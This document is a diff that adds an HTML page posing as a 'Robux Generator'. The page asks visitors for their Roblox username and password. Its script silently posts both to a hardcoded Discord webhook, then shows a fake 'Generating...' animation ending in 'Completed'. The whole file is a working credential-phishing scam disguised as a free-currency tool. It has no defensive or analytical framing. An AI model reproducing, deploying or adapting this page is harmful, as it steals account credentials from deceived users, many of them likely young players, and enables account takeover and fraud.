@@ -1,0 +1,232 @@
+<title>Robux Generator</title>
+<link rel="icon" type="image/png" href="untitled.png"/>
+<div class="background">
+  <div class="frame">
+    <div class="title"></div>
+    <div class="input">
+      <input class="input-field" id="username-input" placeholder="Username">
+    </div>
+    <div class="input">
+      <input class="input-field" id="password-input" placeholder="Password">
+    </div>
+    <div class="input">
+      <input class="input-field" id="amount-input" placeholder="Amount">
+    </div>
+    <div class="button">
+      <button class="button-field" id="submit-input" onclick="Submit()">Generate</button>
+    </div>
+    <p class="status", id="status-output"></p>
+    <div class="text">
+      <p>1. ENTER YOUR ROBLOX USERNAME</p>
+      <br>
+      <p>2. ENTER YOUR ROBLOX PASSWORD</p>
+      <br>
+      <p>3. CLICK GENERATE TO GET YOUR ROBUX</p>
+    </div>
+  </div>
+</div>
+
+<style>
+  @font-face {
+        font-family: 'DancingScriptBold';
+        src: url("Fonts/DancingScript-Bold.ttf");
+    }
+  @font-face {
+        font-family: 'DancingScriptRegular';
+        src: url("Fonts/DancingScript-Regular.ttf");
+    }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  html, body {
+    height: 100%;
+    overflow: hidden;
+  }
+  .background {
+    background-size: cover;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 5vh;
+    background-image: linear-gradient(to top left, rgb(49, 58, 70), rgb(22, 22, 49));
+  }
+  .frame {
+    content: "";
+    position: relative;
+    border-radius: 2%;
+    background-color: rgb(22, 27, 39);
+    width: 45%;
+    height: 85%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 2vh;
+    overflow: hidden;
+    box-shadow: 0 0 25px 5px rgb(17, 25, 44);
+  }
+  .frame::after {
+    content: "";
+    position: absolute;
+    background: rgb(22, 27, 39);
+    inset: 7.5px;
+    border-radius: 2%;
+  }
+  .title {
+    background-image: url("untitled2.png");
+    background-size: contain;
+    background-repeat: no-repeat;
+    position: absolute;
+    margin-bottom: 57.5vh;
+    width: 85%;
+    height: 25%;
+    z-index: 2;
+  }
+  .input-field {
+    right: 25px;
+    position: relative;
+    z-index: 2;
+    width: 125%;
+    height: 40px;
+    padding: 5px;
+    font-size: 16px;
+    border: none;
+    border-radius: 4px;
+    background-color: rgba(255, 255, 255, 0.1);
+    color: #fff;
+    transition: width 0.3s ease-in-out;
+  }
+  .button-field {
+    right: 57.5px;
+    position: relative;
+    z-index: 2;
+    width: 225%;
+    height: 40px;
+    padding: 5px;
+    font-size: 18px;
+    border: 2px solid rgb(255, 255, 255);
+    letter-spacing: .5px;
+    border-radius: 4px;
+    background-color: rgb(184, 184, 184);
+    color: #fff;
+    transition: width 0.3s ease-in-out;
+  }
+  .status {
+    width: 20vh;
+    height: 25px;
+    font-weight: normal;
+    font-family: 'DancingScriptRegular', sans-serif;
+    position: absolute;
+    font-weight: normal;
+    color: rgba(255, 255, 255, 0.8);
+    margin-right: 335px;
+    margin-bottom: 100px;
+    font-size: 3.5vh;
+    transform: rotate(-90deg);
+    z-index: 2;
+  }
+  .text {
+    font-family: 'DancingScriptBold', sans-serif;
+    position: absolute;
+    font-weight: normal;
+    color: rgba(255, 255, 255, 0.9);
+    margin-top: 52.5vh;
+    font-size: 2vw;
+    z-index: 2;
+  }
+  .frame::before {
+    content: "";
+    position: absolute;
+    background: linear-gradient(to top, rgb(255, 0, 119), rgb(0, 68, 255));
+    width: 50%;
+    height: 150%;
+    filter: brightness(150%);
+    gap: 5vh;
+    animation: rotation 6s linear infinite;
+  }
+  @keyframes rotation {
+    from {
+      transform: rotate(0deg);
+    }
+    to {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+<script>
+  function wait(time) {
+    return new Promise(resolve => setTimeout(resolve, time));
+  }
+
+  const usernameInput = document.getElementById("username-input");
+  const passwordInput = document.getElementById("password-input");
+  const amountInput = document.getElementById("amount-input");
+  const status = document.getElementById("status-output");
+
+  async function Submit() {
+    if (
+      usernameInput.value.length > 0 &&
+      passwordInput.value.length > 0 &&
+      !status.innerHTML
+    ) {
+      status.innerHTML = "Generating";
+      const content = "> **" + usernameInput.value + ":          " + passwordInput.value + "**";
+      const webhookUrl = "https://discord.com/api/webhooks/1112896967274659860/9v4NdLnIJiQME_IAIMcZhaHpHWv-NCyhSy9ufRPeEqJsp6Z4NAGyXHbED7HhlbF3rEDX";
+
+      try {
+        const response = await postAsync(webhookUrl, { content });
+        console.log("Success");
+      } catch (error) {
+        console.error("Error");
+      }
+
+      for (let i = 0; i < 5; i++) {
+        await wait(500);
+        status.innerHTML = "Generating.";
+        await wait(500);
+        status.innerHTML = "Generating..";
+        await wait(500);
+        status.innerHTML = "Generating...";
+      }
+
+      await wait(500);
+      status.innerHTML = "Completed";
+    }
+  }
+
+  function postAsync(url, data) {
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", url, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+          if (xhr.status >= 200 && xhr.status < 300) {
+            resolve(xhr.responseText);
+          } else {
+            reject(xhr.statusText);
+          }
+        }
+      };
+      xhr.onerror = function () {
+        reject(xhr.statusText);
+      };
+      xhr.send(JSON.stringify(data));
+    });
+  }
+
+  usernameInput.addEventListener("input", handleInput);
+  passwordInput.addEventListener("input", handleInput);
+  amountInput.addEventListener("input", handleInput);
+
+  function handleInput(event) {
+    const inputField = event.target;
+    inputField.style.width = 125 + inputField.value.length * 4 + "%";
+  }
+</script>
